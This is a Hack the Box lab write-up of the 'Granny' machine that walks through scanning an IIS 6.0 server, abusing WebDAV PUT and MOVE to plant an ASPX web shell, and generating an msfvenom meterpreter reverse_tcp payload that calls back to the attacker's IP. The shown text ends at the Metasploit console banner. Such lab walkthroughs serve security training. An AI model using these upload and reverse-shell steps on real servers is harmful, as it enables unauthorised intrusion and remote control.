# Hack the Box: Granny

## Port Scan
Discover open ports on the target machine.
```shell
rustscan -a 10.10.10.15 -r 0-65535 -b 1000 -u 5000 -- -Pn

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.15:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -Pn" on ip 10.10.10.15
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-25 12:40 IST
Initiating Parallel DNS resolution of 1 host. at 12:40
Completed Parallel DNS resolution of 1 host. at 12:40, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:40
Scanning 10.10.10.15 [1 port]
Discovered open port 80/tcp on 10.10.10.15
Completed Connect Scan at 12:40, 0.15s elapsed (1 total ports)
Nmap scan report for 10.10.10.15
Host is up, received user-set (0.15s latency).
Scanned at 2023-09-25 12:40:35 IST for 0s

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
```

## Exposed Services
Identify services running on the open ports.
```shell
rustscan -a 10.10.10.15 -p 80 -u 5000 -- -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.15:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sC -sV" on ip 10.10.10.15
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-25 12:43 IST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
Initiating Ping Scan at 12:43
Scanning 10.10.10.15 [2 ports]
Completed Ping Scan at 12:43, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:43
Completed Parallel DNS resolution of 1 host. at 12:43, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:43
Scanning 10.10.10.15 [1 port]
Discovered open port 80/tcp on 10.10.10.15
Completed Connect Scan at 12:43, 0.15s elapsed (1 total ports)
Initiating Service scan at 12:43
Scanning 1 service on 10.10.10.15
Completed Service scan at 12:43, 6.41s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.15.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 5.11s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.63s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
Nmap scan report for 10.10.10.15
Host is up, received syn-ack (0.15s latency).
Scanned at 2023-09-25 12:43:31 IST for 12s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Server Date: Mon, 25 Sep 2023 07:13:39 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds
```

---

### Port #80 HTTP
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/98a3bc59-afc0-4947-9331-a9c0203a5635)

---

## WebDAV
Web Distributed Authoring and Versioning or WebDAV is a protocol whose basic functionality includes enabling users to share, copy, move and edit files through a web server. 

```shell
davtest --url http://10.10.10.15

********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: lOl40HHuEoYCr
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_lOl40HHuEoYCr
********************************************************
 Sending test files
PUT     aspx    FAIL
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.php
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.cfm
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.html
PUT     cgi     FAIL
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.jhtml
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.txt
PUT     asp     FAIL
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.pl
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.jsp
PUT     shtml   FAIL
********************************************************
 Checking for test file execution
EXEC    php     FAIL
EXEC    cfm     FAIL
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.html
EXEC    html    FAIL
EXEC    jhtml   FAIL
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.txt
EXEC    txt     FAIL
EXEC    pl      FAIL
EXEC    jsp     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr
PUT File: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.php
PUT File: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.cfm
PUT File: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.html
PUT File: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.jhtml
PUT File: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.txt
PUT File: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.pl
PUT File: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.jsp
Executes: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.html
Executes: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.txt
```

### Test WebDAV Manually
```shell
echo "PwnStuff" > test.txt
curl -X PUT http://10.10.10.15/test.txt -d @test.txt
curl http://10.10.10.15/test.txt
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/1c36428b-c238-45b6-8777-204a653acd71)

```shell
curl -X PUT http://10.10.10.15/test.aspx -d @test.txt

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>The page cannot be displayed</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<STYLE type="text/css">
  BODY { font: 8pt/12pt verdana }
  H1 { font: 13pt/15pt verdana }
  H2 { font: 8pt/12pt verdana }
  A:link { color: red }
  A:visited { color: maroon }
</STYLE>
</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>

<h1>The page cannot be displayed</h1>
You have attempted to execute a CGI, ISAPI, or other executable program from a directory that does not allow programs to be executed.
<hr>
<p>Please try the following:</p>
<ul>
<li>Contact the Web site administrator if you believe this directory should allow execute access.</li>
</ul>
<h2>HTTP Error 403.1 - Forbidden: Execute access is denied.<br>Internet Information Services (IIS)</h2>
<hr>
<p>Technical Information (for support personnel)</p>
<ul>
<li>Go to <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft Product Support Services</a> and perform a title search for the words <b>HTTP</b> and <b>403</b>.</li>
<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr),
 and search for topics titled <b>Configuring ISAPI Extensions</b>, <b>Configuring CGI Applications</b>, <b>Securing Your Site with Web Site Permissions</b>, and <b>About Custom Error Messages</b>.</li>
<li>In the IIS Software Development Kit (SDK) or at the <a href="http://go.microsoft.com/fwlink/?LinkId=8181">MSDN Online Library</a>, search for topics titled <b>Developing ISAPI Extensions</b>, <b>ISAPI and CGI</b>, and <b>Debugging ISAPI Extensions and Filters</b>.</li>
</ul>

</TD></TR></TABLE></BODY></HTML>

```shell
curl -X MOVE -H 'Destination:http://10.10.10.15/test.aspx' http://10.10.10.15/test.txt
curl http://10.10.10.15/test.aspx
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2bc4a9ea-988a-43b5-b152-014075609db5)

---

### Upload Web Shell
```shell
cp /usr/share/webshells/aspx/cmdasp.aspx .
mv cmdasp.aspx revsh.txt
```

### Move Web Shell
```shell
curl -X PUT http://10.10.10.15/revsh.txt -d @revsh.txt
curl -X MOVE -H 'Destination:http://10.10.10.15/revsh.aspx' http://10.10.10.15/revsh.txt
```

### Access Web Shell
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9f945906-a62a-457b-b743-641e12ce5ae8)

---

## MSF Venom
Using msfvenom and metasploit to get a reverse shell from the target machine.

### Generate Shell
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f aspx > shell.aspx
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c3c4c830-1a83-4773-9a6a-04f9665547a5)


### Upload Shell 
Upload the shell with `.txt` extension and then use the move http method to rename the shell with the `.aspx` extension.
```shell
curl -X PUT http://10.10.10.15/shell.txt -d @shell.aspx
curl -X MOVE -H 'Destination: http://10.10.10.15/shell.aspx' http://10.10.10.15/shell.txt
```

## Metasploit
Start
```shell
msfconsole
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.3.19-dev                          ]
+ -- --=[ 2318 exploits - 1215 auxiliary - 412 post       ]
+ -- --=[ 1234 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use the edit command to open the 
currently active module in your editor
Metasploit Documentation: https://docs.metasploit.com/

msf6>
```

